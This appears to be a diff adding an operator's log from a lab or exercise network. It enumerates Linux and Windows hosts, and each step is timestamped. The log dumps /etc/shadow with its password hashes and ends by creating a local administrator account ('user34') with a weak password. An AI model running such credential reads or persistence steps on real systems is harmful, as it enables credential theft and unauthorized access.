+[user4@desktop-user12 ~]$ sudo cat /etc/shadow
+root:$6$6Ybfmtg3S$Wd2uUO3MrjhP5381L83wKf4S5f1waKDH5pt.VSE2UOnAmVP2yxQQK/AIrxVyxRdwFgeeockBj8NcpzPjp6glj0:19067:0:99999:7:::
+bin:*:17834:0:99999:7:::
+daemon:*:17834:0:99999:7:::
+adm:*:17834:0:99999:7:::
+lp:*:17834:0:99999:7:::
+sync:*:17834:0:99999:7:::
+shutdown:*:17834:0:99999:7:::
+halt:*:17834:0:99999:7:::
+mail:*:17834:0:99999:7:::
+operator:*:17834:0:99999:7:::
+games:*:17834:0:99999:7:::
+ftp:*:17834:0:99999:7:::
+nobody:*:17834:0:99999:7:::
+systemd-network:!!:18116::::::
+dbus:!!:18116::::::
+polkitd:!!:18116::::::
+rpc:!!:18116:0:99999:7:::
+rpcuser:!!:18116::::::
+nfsnobody:!!:18116::::::
+sshd:!!:18116::::::
+postfix:!!:18116::::::
+chrony:!!:18116::::::
+centos:!!:19065:0:99999:7:::
+user1:$1$T/UJ0rCH$6z8tIIy0H3yAZBi96ayoQ/:19067:0:99999:7:::
+user2:$1$ftWl6MiI$.vzeKoZHvgaCLYVaXhaYe0:19067:0:99999:7:::
+user3:$1$N1LUSpyw$vJCMGKB3AP2WD.9sesz7A/:19067:0:99999:7:::
+user4:$1$L0P0wn8P$lhwBDGloYS9FBmYFtBp5I1:19067:0:99999:7:::
+user5:$1$DE5kuTTW$t6jCtAZ2HIrKe8L4PYxRz.:19067:0:99999:7:::
+user6:$1$7hPu1p1Q$sG7QbbDhCDDg9l1uVO.7J1:19067:0:99999:7:::
+user7:$1$WO00AvDz$1SJ9ZLU3qbzFnRUdfoAmc0:19067:0:99999:7:::
+user8:$1$JOHsPyE1$PjpLdIv.XmDDmfrwcJpcv.:19067:0:99999:7:::
+user9:$1$vjLzisKK$VZ6UroMbozHfF/rHYpOvT1:19067:0:99999:7:::
+user10:$1$C6jODBnH$NNdxNlirhn8Hn.pq5aHQG/:19067:0:99999:7:::
+user11:$1$YEd3pG1H$r/UTbrJ79mY6coWbkAKMG0:19067:0:99999:7:::
+user12:$1$wE7n5qXx$PZdozd9WbStgxXQasb.3U0:19067:0:99999:7:::
+user13:$1$.cWjjRPV$XCCVfKGvcfHDCNuo3AQb41:19067:0:99999:7:::
+user14:$1$tdNbnl4c$IYMiIftFh1jY5FlvRNa80.:19067:0:99999:7:::
+user15:$1$nkBKMpy/$igJyyjonZD1vm6fwqNDff0:19067:0:99999:7:::
+user16:$1$0KgF.2Kd$qj3pzzQBCBnd68n1eO.Aj/:19067:0:99999:7:::
+user17:$1$3PHwgTRW$I3g4qmm.AuWco6iOCArnI.:19067:0:99999:7:::
+user18:$1$lfyXvqR7$WfwTS9pHkFB.r9jnWBciS/:19067:0:99999:7:::
+user19:$1$C26js/eE$tOmfhQzPC0CArhFHpwK9k1:19067:0:99999:7:::
+user20:$1$gm3AvgCr$hoQ8FfIoA2Dt.lHCGnB610:19067:0:99999:7:::
+user21:$1$KJdNTvrp$AASH53Szlxel2dJ4AW0pt/:19067:0:99999:7:::
+user22:$1$NrfBJEjt$r47xgWlORHoVPD9jFzsX/1:19067:0:99999:7:::
+user23:$1$Hep.4FCd$aAYzoNIjz3fTXG9i.UxUJ1:19067:0:99999:7:::
+radicle:$1$63lSU6S9$BbGXlEqH3aLFmCedh.Ptd.:19067:0:99999:7:::
+
+[user4@desktop-user12 ~]$ cat /etc/group
+root:x:0:
+bin:x:1:
+daemon:x:2:
+sys:x:3:
+adm:x:4:centos
+tty:x:5:
+disk:x:6:
+lp:x:7:
+mem:x:8:
+kmem:x:9:
+wheel:x:10:centos
+cdrom:x:11:
+mail:x:12:postfix
+man:x:15:
+dialout:x:18:
+floppy:x:19:
+games:x:20:
+tape:x:33:
+video:x:39:
+ftp:x:50:
+lock:x:54:
+audio:x:63:
+nobody:x:99:
+users:x:100:
+utmp:x:22:
+utempter:x:35:
+input:x:999:
+systemd-journal:x:190:centos
+systemd-network:x:192:
+dbus:x:81:
+polkitd:x:998:
+rpc:x:32:
+ssh_keys:x:997:
+cgred:x:996:
+rpcuser:x:29:
+nfsnobody:x:65534:
+sshd:x:74:
+postdrop:x:90:
+postfix:x:89:
+chrony:x:995:
+centos:x:1000:
+
+[user4@desktop-user12 ~]$ sudo lastb
+student2 ssh:notty    192.168.169.43   Wed Aug 17 15:19 - 15:19  (00:00)    
+student2 ssh:notty    192.168.169.43   Wed Aug 17 15:18 - 15:18  (00:00)    
+
+btmp begins Wed Aug 17 15:18:56 2022
+
+2022-08-17 15:33:42-- done catalog
+
+2022-08-17 15:41:03-- OFF 
+
+
+
+------------------------X
+=========================
+
+=========================
+T7: 192.168.169.113
+=========================
+X-----------------------
+
+
+2022-08-17 15:58:19-- ON
+
+2022-08-17 15:58:21-- start vetting
+
+user4@DESKTOP-USER13 C:\Users\user4>ipconfig /all
+
+Windows IP Configuration
+                        
+   Host Name . . . . . . . . . . . . : DESKTOP-USER13
+   Primary Dns Suffix  . . . . . . . :               
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No    
+   WINS Proxy Enabled. . . . . . . . : No    
+   DNS Suffix Search List. . . . . . : vta   
+                                             
+Ethernet adapter Ethernet:                   
+                                             
+   Connection-specific DNS Suffix  . : vta                                   
+   Description . . . . . . . . . . . : Red Hat VirtIO Ethernet Adapter       
+   Physical Address. . . . . . . . . : FA-16-3E-15-4B-A0                     
+   DHCP Enabled. . . . . . . . . . . : Yes                                   
+   Autoconfiguration Enabled . . . . : Yes                                   
+   Link-local IPv6 Address . . . . . : fe80::dc45:e3ee:9db:5885%6(Preferred) 
+   IPv4 Address. . . . . . . . . . . : 192.168.169.113(Preferred)            
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0                         
+   Lease Obtained. . . . . . . . . . : Wednesday, August 10, 2022 12:46:19 AM
+   Lease Expires . . . . . . . . . . : Thursday, August 18, 2022 10:43:27 AM 
+   Default Gateway . . . . . . . . . : 192.168.169.1                            
+   DHCP Server . . . . . . . . . . . : 192.168.169.2                            
+   DHCPv6 IAID . . . . . . . . . . . : 117052990                                
+   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-29-98-76-55-FA-16-3E-15-4B-A0
+   DNS Servers . . . . . . . . . . . : 10.50.255.254                            
+   NetBIOS over Tcpip. . . . . . . . : Enabled                                  
+
+user4@DESKTOP-USER13 C:\Users\user4>date /t
+Wed 08/17/2022                      
+                                    
+user4@DESKTOP-USER13 C:\Users\user4>time /t
+03:58 PM
+
+user4@DESKTOP-USER13 C:\Users\user4>query user
+ USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+ user23                console             1  Active      none   8/10/2022 12:51 AM
+
+user4@DESKTOP-USER13 C:\Users\user4>reg query hklm\software\microsoft\windows\currentversion\run
+
+HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run
+    SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
+
+TaskName:                             \Microsoft\Windows\Windows Error Reporting\QueueReporting
+TaskName:                             \Microsoft\Windows\Windows Error Reporting\QueueReporting
+TaskName:                             \Microsoft\Windows\Windows Error Reporting\QueueReporting
+TaskName:                             \Microsoft\Windows\Windows Error Reporting\QueueReporting
+TaskName:                             \Microsoft\Windows\Windows Error Reporting\QueueReporting
+
+Task To Run:                          C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2207.5-0\MpCmdRun.exe -IdleTask -TaskName WdVeri
+TaskName:                             \Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh
+TaskName:                             \Microsoft\Windows\BitLocker\BitLocker Encrypt All Drives
+
+ Log Name: Security
+  User Name: N/A
+        Account Name:           DESKTOP-USER13$
+        Group Name:             Backup Operators
+Process Information:
+        Process ID:             0x143c
+        Process Name:           C:\Windows\System32\VSSVC.exe
+
+user4@DESKTOP-USER13 C:\Users\user4>certutil -hashfile C:\Windows\System32\VSSVC.exe MD5
+MD5 hash of C:\Windows\System32\VSSVC.exe:
+875046ad4755396636a68f4a9edb22a4
+CertUtil: -hashfile command completed successfully.
+
+NisSrv.exe                    3664 Services                   0     10,640 K Unknown         NT AUTHORITY\LOCAL SERVICE
+
+2022-08-17 16:50:06-- done vetting
+
+2022-08-17 16:50:09-- catalog users
+
+user4@DESKTOP-USER13 C:\Users\user4>query user
+ USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+ user23                console             1  Active      none   8/10/2022 12:51 AM
+
+user4@DESKTOP-USER13 C:\Users\user4>net user
+
+User accounts for \\DESKTOP-USER13
+
+-------------------------------------------------------------------------------
+Admin                    Administrator            cloudbase-init
+DefaultAccount           Guest                    sshd
+user1                    user10                   user11
+user12                   user13                   user14
+user15                   user16                   user17
+user18                   user19                   user2
+user20                   user21                   user22
+user23                   user25                   user3
+user4                    user49                   user5
+user50                   user6                    user7                    
+user8                    user9                    WDAGUtilityAccount
+The command completed successfully.
+
+user4@DESKTOP-USER13 C:\Users\user4>net localgroup
+
+Aliases for \\DESKTOP-USER13
+
+-------------------------------------------------------------------------------
+*Access Control Assistance Operators
+*Administrators
+*Backup Operators
+*Cryptographic Operators
+*Device Owners
+*Distributed COM Users
+*Event Log Readers
+*Guests
+*Hyper-V Administrators
+*IIS_IUSRS
+*Network Configuration Operators
+*Performance Log Users
+*Performance Monitor Users
+*Power Users
+*Remote Desktop Users
+*Remote Management Users
+*Replicator
+*System Managed Accounts Group
+*Users
+The command completed successfully.
+
+user4@DESKTOP-USER13 C:\Users\user4>reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon
+    AutoRestartShell    REG_DWORD    0x1
+    Background    REG_SZ    0 0 0
+    CachedLogonsCount    REG_SZ    10
+    DebugServerCommand    REG_SZ    no
+    DisableBackButton    REG_DWORD    0x1
+    EnableSIHostIntegration    REG_DWORD    0x1
+    ForceUnlockLogon    REG_DWORD    0x0
+    LegalNoticeCaption    REG_SZ
+    LegalNoticeText    REG_SZ
+    PasswordExpiryWarning    REG_DWORD    0x5
+    PowerdownAfterShutdown    REG_SZ    0
+    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
+    ReportBootOk    REG_SZ    1
+    Shell    REG_SZ    explorer.exe
+    ShellCritical    REG_DWORD    0x0
+    ShellInfrastructure    REG_SZ    sihost.exe
+    SiHostCritical    REG_DWORD    0x0
+    SiHostReadyTimeOut    REG_DWORD    0x0
+    SiHostRestartCountLimit    REG_DWORD    0x0
+    SiHostRestartTimeGap    REG_DWORD    0x0
+    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
+    WinStationsDisabled    REG_SZ    0
+    scremoveoption    REG_SZ    0
+    LastLogOffEndTimePerfCounter    REG_QWORD    0x32bd69c68a6
+    ShutdownFlags    REG_DWORD    0x2087
+    Userinit    REG_SZ    C:\windows\system32\userinit.exe,
+    DisableCad    REG_DWORD    0x1
+    DisableLockWorkstation    REG_DWORD    0x0
+    EnableFirstLogonAnimation    REG_DWORD    0x1
+    ShellAppRuntime    REG_SZ    ShellAppRuntime.exe
+    AutoLogonSID    REG_SZ    S-1-5-21-2051571973-2520610965-2581896981-1026
+    LastUsedUsername    REG_SZ    user23
+
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon\AlternateShells
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon\GPExtensions
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon\SpecialAccounts
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon\UserDefaults
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon\AutoLogonChecked
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon\VolatileUserMgrKey
+
+user4@DESKTOP-USER13 C:\Users\user4>dir /o:d /t:w c:\Users
+ Volume in drive C is OS
+ Volume Serial Number is 00E6-9C0D
+
+ Directory of c:\Users
+
+05/23/2022  08:00 PM    <DIR>          user12
+05/23/2022  08:00 PM    <DIR>          cloudbase-init
+05/23/2022  08:00 PM    <DIR>          user8
+05/23/2022  08:01 PM    <DIR>          user11
+05/23/2022  08:01 PM    <DIR>          user18
+05/23/2022  08:01 PM    <DIR>          user3
+05/23/2022  08:01 PM    <DIR>          Administrator
+05/23/2022  08:01 PM    <DIR>          Admin
+05/23/2022  08:02 PM    <DIR>          user14
+05/23/2022  08:02 PM    <DIR>          user7
+05/23/2022  08:02 PM    <DIR>          user10
+05/23/2022  08:02 PM    <DIR>          user15
+05/23/2022  08:02 PM    <DIR>          user6
+05/23/2022  08:02 PM    <DIR>          user13
+05/23/2022  08:02 PM    <DIR>          user16
+05/23/2022  08:03 PM    <DIR>          user5
+05/23/2022  08:03 PM    <DIR>          user9
+05/24/2022  03:38 AM    <DIR>          Public
+07/29/2022  01:22 PM    <DIR>          user23
+08/17/2022  03:57 PM    <DIR>          user4
+08/17/2022  04:02 PM    <DIR>          user19
+08/17/2022  04:16 PM    <DIR>          user20
+08/17/2022  04:18 PM    <DIR>          user17
+08/17/2022  04:29 PM    <DIR>          ..
+08/17/2022  04:29 PM    <DIR>          .
+08/17/2022  04:29 PM    <DIR>          user21
+08/17/2022  04:40 PM    <DIR>          user2
+08/17/2022  04:44 PM    <DIR>          user1
+               0 File(s)              0 bytes
+              28 Dir(s)  14,922,289,152 bytes free
+
+PS C:\Users\user4> Get-LocalUser | Select *
+
+
+AccountExpires         :
+Description            : Admin user
+Enabled                : True
+FullName               : Admin
+PasswordChangeableDate : 3/16/2022 12:56:41 PM
+PasswordExpires        :
+UserMayChangePassword  : True
+PasswordRequired       : False
+PasswordLastSet        : 3/16/2022 12:56:41 PM
+LastLogon              : 3/16/2022 12:53:33 PM
+Name                   : Admin
+SID                    : S-1-5-21-2051571973-2520610965-2581896981-1000
+PrincipalSource        : Local
+ObjectClass            : User
+
+AccountExpires         :
+Description            : Built-in account for administering the computer/domain
+Enabled                : True
+FullName               :
+PasswordChangeableDate : 3/16/2022 12:54:05 PM
+PasswordExpires        :
+UserMayChangePassword  : True
+PasswordRequired       : True
+PasswordLastSet        : 3/16/2022 12:54:05 PM
+LastLogon              : 5/13/2022 1:07:19 PM
+Name                   : Administrator
+SID                    : S-1-5-21-2051571973-2520610965-2581896981-500
+PrincipalSource        : Local
+ObjectClass            : User
+
+AccountExpires         :
+Description            :
+Enabled                : True
+FullName               : cloudbase-init
+PasswordChangeableDate : 8/10/2022 12:47:31 AM
+PasswordExpires        :
+UserMayChangePassword  : False
+PasswordRequired       : True
+PasswordLastSet        : 8/10/2022 12:47:31 AM
+LastLogon              : 8/10/2022 12:47:51 AM
+Name                   : cloudbase-init
+SID                    : S-1-5-21-2051571973-2520610965-2581896981-1002
+PrincipalSource        : Local
+ObjectClass            : User
+
+AccountExpires         :
+Description            : A user account managed by the system.
+Enabled                : False
+FullName               :
+PasswordChangeableDate :
+PasswordExpires        :
+UserMayChangePassword  : True
+PasswordRequired       : False
+PasswordLastSet        :
+LastLogon              :
+Name                   : DefaultAccount
+SID                    : S-1-5-21-2051571973-2520610965-2581896981-503
+PrincipalSource        : Local
+ObjectClass            : User
+
+AccountExpires         :
+Description            : Built-in account for guest access to the computer/domain
+Enabled                : False
+FullName               :
+PasswordChangeableDate :
+PasswordExpires        :
+UserMayChangePassword  : False
+PasswordRequired       : False
+PasswordLastSet        :
+LastLogon              :
+Name                   : Guest
+SID                    : S-1-5-21-2051571973-2520610965-2581896981-501
+PrincipalSource        : Local
+ObjectClass            : User
+
+
+AccountExpires         :
+Description            :
+Enabled                : True
+FullName               : sshd
+PasswordChangeableDate : 3/16/2022 12:54:53 PM
+PasswordExpires        :
+UserMayChangePassword  : True
+PasswordRequired       : True
+PasswordLastSet        : 3/16/2022 12:54:53 PM
+LastLogon              :
+Name                   : sshd
+SID                    : S-1-5-21-2051571973-2520610965-2581896981-1003
+PrincipalSource        : Local
+ObjectClass            : User
+
+AccountExpires         :
+Description            :
+Enabled                : True
+FullName               :
+PasswordChangeableDate : 3/16/2022 12:55:47 PM
+PasswordExpires        :
+UserMayChangePassword  : True
+PasswordRequired       : True
+PasswordLastSet        : 3/16/2022 12:55:47 PM
+LastLogon              : 8/17/2022 1:26:50 PM
+Name                   : user23
+SID                    : S-1-5-21-2051571973-2520610965-2581896981-1026
+PrincipalSource        : Local
+ObjectClass            : User
+
+AccountExpires         : 
+Description            :
+Enabled                : True
+FullName               :
+PasswordChangeableDate : 3/16/2022 12:54:58 PM
+PasswordExpires        :
+UserMayChangePassword  : True
+PasswordRequired       : True
+PasswordLastSet        : 3/16/2022 12:54:58 PM
+LastLogon              : 8/17/2022 3:57:41 PM
+Name                   : user4
+SID                    : S-1-5-21-2051571973-2520610965-2581896981-1007
+PrincipalSource        : Local
+ObjectClass            : User
+
+AccountExpires         :
+Description            : A user account managed and used by the system for Windows Defender Application Guard scenarios.
+Enabled                : False
+FullName               :
+PasswordChangeableDate : 1/4/2019 2:34:44 AM
+PasswordExpires        :
+UserMayChangePassword  : True
+PasswordRequired       : True
+PasswordLastSet        : 1/4/2019 2:34:44 AM
+LastLogon              :
+Name                   : WDAGUtilityAccount
+SID                    : S-1-5-21-2051571973-2520610965-2581896981-504
+PrincipalSource        : Local
+ObjectClass            : User
+
+2022-08-17 17:00:10-- done catalog
+
+####ADD USER####
+2022-08-17 17:15:12-- net user /add user34 P455w0rd
+
+2022-08-17 17:15:30-- net localgroup Administrators user34 /add
+
+2022-08-17 17:15:33-- done
+
+2022-08-17 17:25:42-- OFF
+------------------------X
+=========================
+
+
